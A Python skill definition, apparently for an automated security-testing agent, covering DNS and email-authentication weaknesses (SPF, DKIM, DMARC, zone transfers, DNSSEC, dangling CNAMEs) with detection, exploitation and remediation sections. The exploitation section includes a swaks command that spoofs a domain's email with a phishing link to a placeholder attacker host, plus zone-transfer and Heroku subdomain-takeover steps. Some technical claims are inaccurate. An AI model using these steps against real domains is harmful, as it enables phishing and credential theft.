"""
DNS Security Skill - SPF, DKIM, DMARC, zone transfer, DNSSEC vulnerabilities
"""

SKILL = {
    "id": "dns_security",
    "name": "DNS Security",
    "category": "infrastructure",
    "severity": "high",

    "detection": """
1. ENUMERATE DNS RECORDS:

   a) Use dns_analyzer tool to retrieve:
      - A/AAAA records (IP addresses)
      - MX records (mail servers)
      - NS records (nameservers)
      - TXT records (SPF, DKIM, DMARC, domain verification)
      - SOA records (zone authority)
      - CNAME records (aliases)

   b) Manual DNS queries:
      ```bash
      nslookup example.com
      dig example.com ANY
      dig example.com A
      dig example.com MX
      dig example.com NS
      dig example.com TXT
      ```

   c) Check all DNS records for sensitive info:
      - Internal IP addresses exposed
      - Third-party services exposed
      - Staging/dev servers in DNS

2. DETECT SPF MISCONFIGURATIONS:

   a) Check for SPF record:
      ```bash
      dig example.com TXT | grep "v=spf1"
      ```

   b) SPF record syntax:
      ```
      v=spf1 ip4:192.168.1.1 include:google.com ~all
      v=spf1 mx -all
      v=spf1 +all  ← CRITICAL: allows anyone to send email
      ```

   c) Vulnerability checks:

      i) +all (Permissive, anyone can send email):
         - "v=spf1 +all" allows any server to send email as domain
         - Attacker can spoof email from target domain
         - CRITICAL vulnerability

      ii) ~all (Softfail, not enforced):
         - Allows unauthorized senders but marks with softfail
         - Recipients may still accept softfail emails
         - MEDIUM vulnerability

      iii) -all (Hardfail, enforce):
         - Rejects emails not from authorized servers
         - Most secure configuration

      iv) No SPF record:
         - Domain can be spoofed
         - MEDIUM vulnerability

      v) SPF with ptr: mechanism:
         - Uses reverse DNS (PTR) checks (slow, deprecated)
         - Can be bypassed
         - MEDIUM vulnerability

      vi) Too many lookups:
         - SPF allows max 10 DNS lookups
         - Complex SPF can exceed limit → email delivery fails
         - Attacker can DoS email

3. DETECT DKIM ISSUES:

   a) Check for DKIM records:
      ```bash
      # Common selectors
      dig default._domainkey.example.com TXT
      dig google._domainkey.example.com TXT
      dig selector1._domainkey.example.com TXT
      dig selector2._domainkey.example.com TXT
      ```

   b) DKIM record format:
      ```
      v=DKIM1; k=rsa; p=MIGfMA0GCS...  (base64 public key)
      ```

   c) Vulnerability checks:

      i) Missing DKIM:
         - No DKIM record at all
         - Emails can't be authenticated
         - MEDIUM vulnerability

      ii) Weak key type:
         - k=rsa with weak bits (< 2048)
         - k=ed25519 or k=rsa with 4096 bits is good
         - MEDIUM vulnerability

      iii) Public key not rotated:
         - Old selectors with expired keys still listed
         - Attacker can use old compromised key

4. DETECT DMARC ISSUES:

   a) Check for DMARC record:
      ```bash
      dig _dmarc.example.com TXT
      ```

   b) DMARC record syntax:
      ```
      v=DMARC1; p=none; rua=mailto:admin@example.com
      v=DMARC1; p=quarantine; rua=mailto:admin@example.com
      v=DMARC1; p=reject; rua=mailto:admin@example.com; ruf=mailto:admin@example.com
      ```

   c) Vulnerability checks:

      i) p=none (Monitoring only):
         - DMARC enabled but not enforced
         - Emails failing authentication still delivered
         - MEDIUM vulnerability

      ii) p=quarantine (Spam folder):
         - Better than "none", failed emails to spam
         - But user might see them
         - MEDIUM vulnerability

      iii) p=reject (Strict):
         - Failed emails rejected
         - Most secure
         - CRITICAL if configured wrong (can lose legitimate email)

      iv) No DMARC record:
         - No domain-level email policy
         - Spoofing not prevented
         - MEDIUM vulnerability

      v) Missing rua= reporting:
         - No aggregate reports
         - Can't see who's spoofing domain
         - LOW vulnerability

      vi) Missing ruf= reporting:
         - No forensic reports
         - Can't see details of attacks
         - LOW vulnerability

      vii) sp=none for subdomains:
         - Subdomain email can be spoofed
         - MEDIUM vulnerability

5. DETECT ZONE TRANSFER VULNERABILITY (AXFR):

   a) Attempt zone transfer:
      ```bash
      dig @ns.example.com example.com AXFR
      dig @8.8.8.8 example.com AXFR
      ```

   b) If zone transfer succeeds:
      - Attacker gets full DNS zone data
      - All subdomains, servers, IPs exposed
      - CRITICAL vulnerability
      - Allows: subdomain enumeration, finding internal systems, IP ranges

   c) Zone transfer should only work from:
      - Authorized secondary nameservers
      - Not from random IPs/public DNS servers

6. DETECT DNSSEC ISSUES:

   a) Check for DNSSEC records:
      ```bash
      dig example.com DNSKEY
      dig example.com RRSIG
      dig example.com DS
      ```

   b) DNSSEC protects against:
      - DNS spoofing (attacker can't forge DNS responses)
      - DNS hijacking
      - Man-in-the-middle attacks on DNS

   c) Vulnerability checks:

      i) No DNSSEC (most common):
         - DNS responses can be spoofed
         - Attacker can redirect traffic
         - CRITICAL vulnerability

      ii) DNSSEC validation disabled on client:
         - Even if server has DNSSEC, client doesn't validate
         - Attacker can still spoof
         - CRITICAL vulnerability

      iii) Weak DNSSEC keys:
         - Using older algorithms (SHA1)
         - Using weak key sizes
         - MEDIUM vulnerability

7. DETECT DANGLING DNS RECORDS:

   a) Check all DNS records for dangling CNAME:
      ```bash
      dig example.com CNAME
      dig www.example.com CNAME
      dig api.example.com CNAME
      dig cdn.example.com CNAME
      ```

   b) Dangling DNS vulnerability:
      ```
      Example:
      www.example.com CNAME example.github.io

      But example.github.io doesn't exist (GitHub account deleted)

      Attacker can:
      1. Create GitHub user: "example"
      2. Create GitHub Pages site
      3. Now attacker controls www.example.com
      4. Can steal cookies, impersonate domain, host malware
      ```

   c) Services vulnerable to dangling DNS:
      - GitHub Pages
      - AWS CloudFront
      - Heroku
      - Azurecdn
      - Akamai
      - Any third-party CDN/hosting

   d) Check for common dangling patterns:
      - Pointing to deleted/expired services
      - Pointing to services you don't own
      - Pointing to services with vulnerable takeover

8. DETECT NS RECORDS POINTING TO WRONG SERVERS:

   a) Enumerate NS records:
      ```bash
      dig example.com NS
      ```

   b) Verify all NS records are legitimate:
      - Do you control these nameservers?
      - Are they owned by your registrar/hosting provider?
      - Check if attacker added unauthorized NS records

9. DETECT MX RECORD ISSUES:

   a) Enumerate MX records:
      ```bash
      dig example.com MX
      ```

   b) Vulnerability checks:

      i) No MX records:
         - Email can't be delivered to domain
         - Or uses A record fallback (insecure)

      ii) MX pointing to external mail provider:
         - Verify you control this provider
         - Or attacker can intercept emails

      iii) Low priority MX to attacker's server:
         - Attacker's server can receive emails
         - Intercept 2FA codes, password resets

10. USING dns_analyzer TOOL:

    Simply run dns_analyzer on domain:
    ```python
    result = await dns_analyzer.execute({
        'target': 'example.com'
    })
    # Returns: SPF, DKIM, DMARC, MX, NS, DNSSEC, zone transfer, findings with severity
    ```
""",

    "exploitation": """
1. EMAIL SPOOFING via SPF BYPASS:

   a) If SPF policy is +all or missing:
      ```bash
      # Send email as example.com using any mail server
      swaks --to victim@gmail.com --from attacker@example.com \
            --server attacker-smtp-server.com \
            --header "Subject: Account Verification" \
            --body "Click here to verify: http://attacker.com/fake-login"
      ```

   b) If SPF has softfail (~all):
      ```bash
      # Email passes SPF softfail
      # Gmail/Outlook still might deliver
      # User sees slight "suspicious" indicator but reads email
      ```

   c) Phishing attack:
      - Send email from "support@example.com"
      - If SPF not strict, email accepted as legitimate
      - Victim clicks link, steals credentials
      - Takes over victim account

2. EMAIL SPOOFING via DKIM BYPASS:

   a) If DKIM not configured:
      ```bash
      # Send unsigned email claiming to be from domain
      # Recipient can't verify it's real
      # Gmail shows: "emails from example.com don't use DKIM"
      ```

   b) If DKIM key is weak (RSA 1024):
      ```bash
      # Attacker brute forces DKIM private key
      # RSA 1024 can be broken in weeks
      # Attacker can now forge signed emails
      ```

   c) DKIM downgrade attack:
      ```bash
      # If old DKIM selector (selector1) uses weak key
      # And new selector (selector2) uses strong key
      # Attacker uses old key to send email
      # Email appears signed, but with old selector
      ```

3. EMAIL SPOOFING via DMARC BYPASS:

   a) If DMARC policy is "none":
      ```bash
      # Email fails SPF and DKIM checks
      # But DMARC p=none means "just report it, don't reject"
      # Email is delivered
      # Attacker sends phishing email, victim never suspects
      ```

   b) If DMARC missing:
      ```bash
      # No domain-level policy at all
      # SPF/DKIM/DMARC alignment not enforced
      # Attacker can send email that passes SPF OR DKIM but not both
      # Most clients only check one
      ```

   c) DMARC subdomain bypass:
      ```bash
      # Main domain has DMARC p=reject
      # But subdomain (api.example.com) doesn't
      # Attacker sends email from "admin@api.example.com"
      # No DMARC policy for subdomain
      # Email delivered
      ```

4. ZONE TRANSFER EXPLOITATION:

   a) Perform full zone transfer:
      ```bash
      dig @ns1.example.com example.com AXFR > zone.txt
      ```

   b) Parse zone file to find:
      - All subdomains (internal, staging, dev, admin, etc)
      - All IP addresses (internal network)
      - All servers and services
      - Mail servers, VPNs, databases

   c) Example zone data extracted:
      ```
      example.com          3600    IN      A       93.184.216.34
      www                  3600    IN      A       93.184.216.35
      api                  3600    IN      A       93.184.216.36
      admin                3600    IN      A       192.168.1.1      (INTERNAL IP!)
      db                   3600    IN      A       192.168.1.5      (DATABASE!)
      staging              3600    IN      A       192.168.1.10
      vpn                  3600    IN      A       10.0.0.1
      mail                 3600    IN      A       93.184.216.100
      ```

   d) Now attacker knows:
      - Subdomains to attack (www, api, admin, db, staging)
      - Internal IPs to compromise
      - Can probe each subdomain for vulnerabilities

5. DNSSEC STRIPPING ATTACK:

   a) If client doesn't validate DNSSEC:
      ```bash
      # Attacker intercepts DNS query
      # Removes DNSSEC signatures from response
      # Client doesn't validate, accepts spoofed DNS
      # Traffic redirected to attacker's server
      ```

   b) Example:
      ```
      Normal: example.com → 93.184.216.34 (real site)
      Attacked: example.com → 10.0.0.1 (attacker site)
      User thinks they're on real site, enters credentials
      Attacker steals credentials
      ```

6. DANGLING DNS SUBDOMAIN TAKEOVER:

   a) If api.example.com CNAME points to deleted Heroku app:
      ```bash
      # Check if target points to deleted service
      dig api.example.com CNAME
      # Output: heroku-api-12345.herokuapp.com

      # Try to create Heroku app with same name
      heroku create heroku-api-12345
      # Success! Now api.example.com points to attacker's server

      # Attacker can:
      # 1. Steal API keys from environment
      # 2. Access user data via API
      # 3. Modify API responses to inject malware
      # 4. Steal authentication tokens
      ```

   b) GitHub Pages takeover:
      ```bash
      # blog.example.com CNAME points to user.github.io
      # User deleted GitHub account

      # Attacker creates GitHub user with same name
      # Creates GitHub Pages site
      # Now blog.example.com serves attacker's content

      # Attacker can:
      # 1. Deface website
      # 2. Serve malware
      # 3. Host phishing pages
      # 4. Steal cookies (if HTTPS, limited)
      ```

7. MX RECORD HIJACKING:

   a) If attacker can modify DNS (via registrar compromise):
      ```bash
      # Change MX record to attacker's server
      example.com MX 10 attacker-mail.com

      # Now all emails to @example.com go to attacker
      # Attacker receives:
      # - Password reset emails (full account takeover)
      # - 2FA codes (if email-based 2FA)
      # - Sensitive documents
      # - Customer/employee emails
      ```

8. NS RECORD HIJACKING:

   a) Complete domain takeover via NS hijacking:
      ```bash
      # Attacker modifies NS records (via registrar compromise)
      example.com NS attacker-ns.com

      # Now attacker's nameserver handles all DNS for domain
      # Attacker can:
      # - Redirect example.com to attacker's server
      # - Redirect email to attacker's server
      # - Create fake subdomains
      # - Issue fake SSL certificates (with DNS validation)
      # - Complete domain compromise
      ```

9. DNS CACHE POISONING:

   a) If DNS resolver not validating DNSSEC:
      ```bash
      # Attacker sends fake DNS response to resolver
      # Resolver caches it
      # All clients get poisoned response

      # Example:
      # Attacker poisons: bank.com → attacker.com
      # Users trying to access bank.com go to attacker's site
      ```

10. TTL MANIPULATION ATTACK:

    a) If attacker can respond before authoritative server:
       ```bash
       # Attacker sends DNS response with low TTL
       # example.com → attacker.com (TTL 1)
       # Resolver caches for 1 second

       # Every second attacker can redirect traffic
       # Combined with DNS rebinding: steal cookies, bypass CSRF
       ```
""",

    "remediation": """
1. IMPLEMENT STRICT SPF POLICY:

   a) Basic SPF configuration:
      ```
      v=spf1 ip4:192.0.2.0/24 include:google.com ~all
      ```

   b) Recommended SPF setup:
      ```
      v=spf1 include:sendgrid.net include:google.com -all
      ```
      - Only authorize known mail servers
      - Use -all (hardfail) not ~all (softfail)

   c) SPF for multiple mail providers:
      ```
      v=spf1 include:google.com include:sendgrid.net include:mailgun.com -all
      ```

   d) Check for SPF errors:
      ```bash
      mxToolbox SPF Check: https://mxtoolbox.com/spf.aspx
      ```

2. IMPLEMENT DKIM:

   a) Generate DKIM keypair:
      ```bash
      # Generate RSA 2048 (minimum) or 4096 bits (better)
      openssl genrsa -out dkim.key 4096
      openssl rsa -in dkim.key -pubout -out dkim.pub
      ```

   b) Create DKIM record:
      ```
      # Extract public key (base64)
      openssl rsa -in dkim.key -pubout -outform PEM | \
      grep -v "BEGIN" | grep -v "END" | tr -d '\n'

      # Create DNS TXT record:
      default._domainkey.example.com TXT "v=DKIM1; k=rsa; p=MIGfMA0GCS..."
      ```

   c) Configure mail server to sign emails:
      - Gmail: Automatically signs if you use Google Workspace
      - SendGrid: Enable DKIM signing in dashboard
      - Postfix:
      ```
      # /etc/postfix/main.cf
      milter_default_action = accept
      smtpd_milters = inet:localhost:8891
      non_smtpd_milters = inet:localhost:8891
      ```

   d) Rotate DKIM keys regularly:
      - Create new selector (selector2) with new key
      - Update DNS to point to new selector
      - Gradually reduce TTL, switch clients
      - Eventually remove old selector

3. IMPLEMENT DMARC:

   a) Start with monitoring (p=none):
      ```
      v=DMARC1; p=none; rua=mailto:admin@example.com
      ```
      - Monitor failures for 30 days
      - See who's spoofing your domain

   b) Transition to quarantine:
      ```
      v=DMARC1; p=quarantine; rua=mailto:admin@example.com; ruf=mailto:admin@example.com; pct=50
      ```
      - Gradually increase pct from 10% to 100%
      - Test before enforcing on all emails

   c) Final: strict rejection:
      ```
      v=DMARC1; p=reject; rua=mailto:admin@example.com; ruf=mailto:admin@example.com; sp=reject; aspf=s; adkim=s
      ```
      - sp=reject: subdomains must also comply
      - aspf=s: SPF must be strictly aligned
      - adkim=s: DKIM must be strictly aligned

4. SECURE NAMESERVERS:

   a) Use secondary nameservers (redundancy):
      - Primary: ns1.example.com (your DNS provider)
      - Secondary: ns2.example.com (different provider)
      - Reduces risk if one provider compromised

   b) Restrict zone transfers:
      ```bash
      # BIND configuration (/etc/bind/named.conf)
      zone "example.com" {
          type master;
          file "/var/lib/bind/example.com.zone";
          allow-transfer { 192.0.2.1; };  # Only secondary nameserver
      };
      ```

   c) Update NS records at registrar:
      - Never hardcode NS records
      - Use registrar's provided nameservers
      - Verify every 6 months

5. ENABLE DNSSEC:

   a) Enable DNSSEC at your DNS provider:
      - Most providers have DNSSEC option
      - Enable KSK (Key Signing Key) and ZSK (Zone Signing Key)

   b) Publish DS record at registrar:
      - DNS provider gives DS record
      - Add to registrar's DNSSEC settings
      - Allows parent zone to verify your signatures

   c) Validate DNSSEC:
      ```bash
      # Test DNSSEC
      dig @8.8.8.8 example.com +dnssec
      # Should show ad (authenticated data) flag
      ```

6. PREVENT DANGLING DNS:

   a) Audit all DNS records:
      ```bash
      dig example.com ANY
      dig *.example.com ANY  # all subdomains
      ```

   b) For each CNAME, verify:
      - Service still exists
      - You control the service
      - Service not publicly available for registration

   c) Remove dangling records:
      ```
      # Before: api.example.com CNAME heroku-api-12345.herokuapp.com (deleted)
      # After: Remove CNAME record entirely
      ```

   d) Use DNS provider monitoring:
      - Set up alerts if DNS changes
      - Monitor for unauthorized modifications

7. RESTRICT MX RECORD MODIFICATIONS:

   a) At registrar:
      - Use strong authentication (2FA)
      - Limit who can modify DNS
      - Require approval for changes

   b) At DNS provider:
      - Use API keys with limited permissions
      - Rotate API keys regularly
      - Log all changes

8. DNS MONITORING & ALERTING:

   a) Monitor DNS changes:
      ```bash
      # Script to check DNS weekly
      dig example.com MX > /tmp/mx.txt
      dig example.com NS > /tmp/ns.txt
      dig example.com TXT > /tmp/txt.txt

      # Compare with previous week
      # Alert if changed
      ```

   b) Monitor for takeover attempts:
      - Check Google Search Console for property issues
      - Monitor certificate transparency logs for your domain
      - Check Let's Encrypt certificates issued for your domain

9. VERIFICATION CHECKLIST:

   ✓ SPF record exists with -all (hardfail)
   ✓ Only authorized mail servers in SPF
   ✓ DKIM configured with 2048+ bit RSA keys
   ✓ DKIM record published and valid
   ✓ DMARC policy p=reject with sp=reject
   ✓ DMARC reporting enabled (rua/ruf)
   ✓ DNSSEC enabled
   ✓ NS records point to legitimate nameservers
   ✓ No dangling CNAME records
   ✓ Zone transfer blocked
   ✓ DNS monitoring enabled
   ✓ All subdomains checked

10. TESTING:

    Use online tools:
    - MXToolbox: https://mxtoolbox.com/
    - DMARCian: https://dmarcian.com/
    - DKIM validator: https://www.mail-tester.com/
""",

    "tools": ["dns_analyzer"],

    "payloads": [
        # SPF tests
        "v=spf1 +all",  # CRITICAL
        "v=spf1 ~all",  # Softfail
        "v=spf1 -all",  # Hardfail
        "v=spf1 ptr:",  # Deprecated

        # DKIM selectors
        "default._domainkey",
        "google._domainkey",
        "selector1._domainkey",
        "selector2._domainkey",
        "k1._domainkey",
        "mail._domainkey",

        # DMARC policies
        "v=DMARC1; p=none",
        "v=DMARC1; p=quarantine",
        "v=DMARC1; p=reject",

        # Zone transfer
        "AXFR",
        "dig @ns.*.* AXFR",

        # DNS records
        "MX", "NS", "TXT", "SOA", "CNAME", "A", "AAAA",

        # Dangling DNS patterns
        "github.io",
        "herokuapp.com",
        "azurecdn.net",
        "cloudfront.net",
        "akamai.net",
        "fastly.net",
    ],

    "references": [
        "DMARC Best Practices: https://dmarc.org/",
        "SPF RFC 7208: https://tools.ietf.org/html/rfc7208",
        "DKIM RFC 6376: https://tools.ietf.org/html/rfc6376",
        "DNSSEC Tutorial: https://www.dnssec.net/",
        "Dangling DNS: https://github.com/projectdiscovery/dnsx",
        "CWE-350: Reliance on Reverse DNS Resolution for Authentication",
        "OWASP: Domain Spoofing",
        "HackerOne: Email Security Best Practices",
    ],
}
